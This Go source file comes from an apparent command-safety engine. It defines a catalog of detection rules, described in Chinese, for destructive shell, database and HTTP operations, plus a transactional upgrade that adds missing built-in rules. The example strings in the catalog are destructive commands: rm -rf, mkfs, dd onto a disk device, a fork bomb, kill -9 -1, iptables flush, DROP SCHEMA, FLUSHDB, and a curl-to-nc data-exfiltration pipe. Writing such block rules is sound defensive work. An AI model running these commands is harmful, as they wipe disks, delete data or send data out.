package core

import (
	"encoding/json"
	"fmt"
)

// Coverage was compared with ARTEX db/db.go at 8dae851b9b622f2ff2631f332fde9719d0b16fba.
// Matchers are implemented here against executable inputs, not copied raw-input regexes.
// The original R1–R6 remain editable independent rules for compatibility.
type detailedRule struct {
	id, name, parent string
	priority         int
	optIn            bool
	summary          string
	checks           []string
	example, limits  string
}

const shellRuleLimits = "只检查可解析的字面量命令、简单 sudo / env / command 包装和 sh / bash -c；不展开变量、别名或外部脚本。打印命令示例不会命中。"
const databaseRuleLimits = "只检查已知数据库客户端的内联语句或对应数据库工具的 query / sql / statement / command 参数；不读取外部脚本文件，不覆盖所有数据库语法。"
const scriptRuleLimits = "只检查 python -c、node -e 和对应执行工具的 code / script 参数中的明确调用，跳过注释及字符串示例；不解析别名、动态方法或外部文件，也不执行代码。"

var detailedRuleCatalog = []detailedRule{
	{"R_SYS_RM", "递归删除 rm -r / rm -rf", "R4", 100, false,
		"识别带递归参数或关闭根目录保护的 rm 命令。", []string{"rm 带 -r / -R（含组合短参数）、--recursive 或 --no-preserve-root，并带删除目标。", "-- 后的文本按文件名处理；--help / --version 不命中。"}, "rm -rf ./fixture", shellRuleLimits},
	{"R_SYS_PATH", "删除系统关键目录", "R4", 100, false,
		"识别 rm / rmdir / shred / wipe 删除关键目录及其内容。", []string{"检查根目录及 /etc、/bin、/usr、/boot、/var、/lib、/lib64、/sys、/proc、/dev、/sbin、/root、/home、/Users、/System、/Library。", "相对路径按项目路径解析；路径须等于目录或处于该目录内，不按子串匹配。"}, "rm /etc/fixture.conf", shellRuleLimits},
	{"R_SYS_FORMAT", "磁盘格式化 mkfs / Format-Volume", "R4", 100, false,
		"识别文件系统格式化与 macOS / Windows 的磁盘清除命令。", []string{"mkfs、mkfs.*、Format-Volume、Clear-Disk。", "diskutil 的 eraseDisk、eraseVolume、partitionDisk 子命令。"}, "mkfs.ext4 /dev/sdb", shellRuleLimits + " PowerShell 仅支持可解析的字面量命令。"},
	{"R_SYS_DD", "覆写磁盘设备 dd / 重定向", "R4", 100, false,
		"识别 dd 输出或 Shell 输出重定向指向磁盘设备。", []string{"dd 的 of= 参数或 > / >> / &> 输出目标指向 /dev 下的 sd、vd、xvd、nvme、mmcblk、disk、rdisk 设备。", "不将 /dev/null、普通文件和仅从磁盘读取视为覆写。"}, "dd if=fixture.img of=/dev/sdb", shellRuleLimits},
	{"R_SYS_FORK", "Fork 炸弹", "R6", 100, false,
		"识别声明后调用的递归后台管道函数。", []string{"Shell 函数的后台管道两侧都直接调用自身，且该函数在命令中被调用。", "支持经典 :(){ :|:& };: 及同结构的命名函数。"}, ":(){ :|:& };:", "仅覆盖上述语法结构；不估算任意循环或程序的资源消耗。"},
	{"R_SYS_SHUTDOWN", "关机 / 重启", "R5", 100, false,
		"识别系统关闭、重启及切换关机运行级别。", []string{"shutdown、reboot、halt、poweroff、Stop-Computer、Restart-Computer。", "init / telinit 的参数为 0 或 6。"}, "init 6", shellRuleLimits},
	{"R_SYS_KILL", "批量终止进程", "R5", 100, false,
		"识别向全部进程发送信号或强制批量终止。", []string{"kill 的目标包含 -1；killall / pkill 使用 -9、-KILL 或 -SIGKILL。", "普通 kill 指定单一 PID 不命中本条；原有 R5 仍会检查进程停止。"}, "kill -9 -1", shellRuleLimits},
	{"R_SYS_WIPE", "磁盘擦除 shred / wipe", "R4", 100, false,
		"识别对磁盘设备的擦除操作。", []string{"shred、wipe、wipefs 的目标是 /dev 下的磁盘设备。", "wipefs 的 -n / --no-act 只预览，不命中本条。"}, "shred /dev/sdb", shellRuleLimits},
	{"R_SYS_FIREWALL", "清空防火墙规则", "R2", 100, false,
		"识别防火墙清空和重置。", []string{"iptables / ip6tables 的 -F、--flush（包括指定表）；nft flush ruleset / table / chain。", "ufw reset；单纯列举规则不命中本条。"}, "iptables -t nat -F", shellRuleLimits},
	{"R_DB_DROP", "SQL DROP 数据库 / 表 / 模式", "R4", 90, false,
		"识别删除数据库对象的 DROP 语句。", []string{"mysql / mariadb -e、psql / sqlcmd -c / -Q、sqlite3 的内联 SQL，或 SQL 工具的语句参数。", "DROP DATABASE / TABLE / SCHEMA / INDEX / VIEW / TABLESPACE / USER / ROLE，忽略 SQL 注释和字符串常量。"}, "psql -c 'DROP SCHEMA fixture CASCADE'", databaseRuleLimits},
	{"R_DB_TRUNCATE", "SQL TRUNCATE 清空表", "R4", 90, false,
		"识别 TRUNCATE 及 TRUNCATE TABLE 语句。", []string{"在数据库执行上下文中检查语句开头的 TRUNCATE，支持多条以分号分隔的语句。", "字符串中的 TRUNCATE 示例和 SQL 注释不计入。"}, "mysql -e 'TRUNCATE TABLE fixture'", databaseRuleLimits},
	{"R_DB_DELETE", "SQL 无条件 DELETE", "R4", 90, false,
		"识别缺少 WHERE 的 DELETE FROM 语句。", []string{"在数据库执行上下文中检查 DELETE FROM，当前语句中没有 WHERE 子句时命中。", "只判断是否缺少 WHERE，不证明 WHERE 条件有效；DELETE WHERE 1=1 等由其它审查处理。"}, "mysql -e 'DELETE FROM fixture'", databaseRuleLimits},
	{"R_DB_MONGO", "MongoDB drop / dropDatabase", "R4", 90, false,
		"识别 MongoDB 数据库或集合删除。", []string{"mongo / mongosh --eval 或 MongoDB 工具的 query / script / command。", "db 对象上的 dropDatabase、dropCollection、集合 drop 调用，跳过注释和字符串内容。"}, "mongosh --eval 'db.fixture.drop()'", databaseRuleLimits},
	{"R_DB_REDIS", "Redis FLUSHALL / FLUSHDB", "R4", 90, false,
		"识别 Redis 清空全部数据库或当前库。", []string{"redis-cli 的实际子命令为 FLUSHALL / FLUSHDB（支持连接参数和 ASYNC / SYNC）。", "Redis 工具的 command / cmd 参数也会检查；GET FLUSHALL 仅作为键读取，不命中。"}, "redis-cli -n 1 FLUSHDB ASYNC", databaseRuleLimits},
	{"R_HTTP_DELETE", "HTTP DELETE · curl / wget / 请求工具", "R4", 80, false,
		"识别 HTTP DELETE 请求及其命令行参数。", []string{"curl 的 -X DELETE、-XDELETE、--request DELETE / --request=DELETE；wget 的 --method DELETE / --method=DELETE。", "请求工具同时包含 url 和 method=DELETE；PowerShell Invoke-WebRequest / Invoke-RestMethod -Method Delete。"}, "curl -X DELETE https://example.test/fixture", shellRuleLimits},
	{"R_HTTP_PYTHON", "Python HTTP 客户端 DELETE", "R4", 80, false,
		"识别 Python 内联执行代码中的 HTTP 删除调用。", []string{"requests / httpx / aiohttp / urllib.request / session / client 的 .delete(...) 调用。", "session / client 按名称约定识别，不能确认动态对象的实际类型。"}, "python -c 'import requests; requests.delete(\"https://example.test/fixture\")'", scriptRuleLimits},
	{"R_HTTP_SCRIPT", "JavaScript / 通用 HTTP DELETE 方法", "R4", 80, false,
		"识别 axios.delete 及请求调用中的 DELETE 方法声明。", []string{"执行代码中的 axios.delete(...)。", "含 fetch / axios / requests / httpx 请求调用的代码中出现 method: 'DELETE' 或 method='DELETE'。"}, "node -e 'fetch(\"https://example.test/fixture\", {method: \"DELETE\"})'", scriptRuleLimits + " 请求调用与方法声明按片段关联，不做完整数据流分析。"},
	{"R_HTTP_CLEAR", "批量清空 / 销毁接口", "R4", 80, false,
		"识别对清空或销毁路径发送的写请求。", []string{"POST / PUT / PATCH / DELETE 请求的 URL 路径段包含 clear、wipe、flush、purge、truncate、drop、destroy、factory-reset、factory_reset、reset-all、reset_all。", "检查结构化请求与 curl / wget / PowerShell 请求；GET / HEAD 及 URL 查询参数里的文字不命中。"}, "curl -X POST https://example.test/api/clear", shellRuleLimits + " 不检查脚本内部拼接出的 URL。"},
	{"R_NET_PIPE", "数据外传管道（可选）", "", 80, true,
		"识别下载 / 网络命令通过管道连接另一网络客户端。", []string{"管道两侧的实际命令为 curl、wget、nc、ncat 或 netcat。", "这种结构也用于正常数据传输，因此默认关闭；仅在需要限制时启用。"}, "curl https://example.test/data | nc example.test 9000", "结构匹配不能证明发生了数据泄露；不检查外部脚本、动态命令或目标归属。"},
}

// Add only missing catalog entries, atomically with one configuration version.
// Existing records are never replaced, including edited builtin matchers.
func (e *Engine) upgradeBuiltinRules(saved []Rule) error {
	byID := map[string]Rule{}
	for _, r := range saved {
		byID[r.ID] = r
	}
	var added []Rule
	for _, r := range BuiltinRules() {
		if _, exists := byID[r.ID]; exists {
			continue
		}
		for _, p := range detailedRuleCatalog {
			if p.id != r.ID || p.parent == "" {
				continue
			}
			if parent, ok := byID[p.parent]; ok {
				// A disabled/replaced/allowing/restricted parent is an intentional
				// policy choice; do not silently re-enable that category on upgrade.
				if !parent.Enabled || parent.Decision != "reject" || parent.Matcher != "semantic" || parent.Tool != "" {
					r.Enabled = false
				}
			}
		}
		added = append(added, r)
	}
	if len(added) == 0 {
		return nil
	}
	tx, err := e.DB.Begin()
	if err != nil {
		return err
	}
	defer tx.Rollback()
	put := func(kind, id string, value any) error {
		b, err := json.Marshal(value)
		if err != nil {
			return err
		}
		_, err = tx.Exec("INSERT INTO records(kind,id,payload) VALUES(?,?,?) ON CONFLICT(kind,id) DO UPDATE SET payload=excluded.payload", kind, id, b)
		return err
	}
	for _, r := range added {
		if err = put("rules", r.ID, r); err != nil {
			return err
		}
	}
	next := e.Settings
	next.Version++
	if err = put("settings", "current", next); err != nil {
		return err
	}
	if err = put("settings_versions", fmt.Sprint(next.Version), next); err != nil {
		return err
	}
	audit := Audit{ID: ID(), Action: "rule.catalog_upgrade", Subject: "builtin", Detail: fmt.Sprintf("补充 %d 条内置规则；保留已有规则，相关大类已停用或自定义时新增条目保持关闭", len(added)), CreatedAt: e.clock()}
	if err = put("audit", audit.ID, audit); err != nil {
		return err
	}
	if err = tx.Commit(); err != nil {
		return err
	}
	e.Settings = next
	return nil
}
